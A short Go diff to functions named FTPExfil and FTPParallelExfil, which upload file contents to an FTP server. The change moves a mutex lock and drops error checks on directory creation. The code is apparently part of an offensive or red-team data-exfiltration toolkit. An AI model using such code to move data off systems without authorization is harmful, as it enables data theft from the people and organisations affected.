@@ -238,20 +238,14 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 			path = strings.Replace(path, "/", "", 1)
 		}
 
-		m.Lock()
-		defer m.Unlock()
-
 		// Fix slashes
 		path = filepath.ToSlash(path)
 
+		m.Lock()
+		defer m.Unlock()
+
 		// Make dirs
-		if e = c.MakeDirRecur(filepath.Dir(path)); e != nil {
-			return errors.Newf(
-				"failed to create directory tree for %s: %w",
-				path,
-				e,
-			)
-		}
+		c.MakeDirRecur(filepath.Dir(path))
 
 		// Upload file
 		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
@@ -312,13 +306,7 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 		path = filepath.ToSlash(path)
 
 		// Make dirs
-		if e = c.MakeDirRecur(filepath.Dir(path)); e != nil {
-			return errors.Newf(
-				"failed to create directory tree for %s: %w",
-				path,
-				e,
-			)
-		}
+		c.MakeDirRecur(filepath.Dir(path))
 
 		// Upload file
 		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
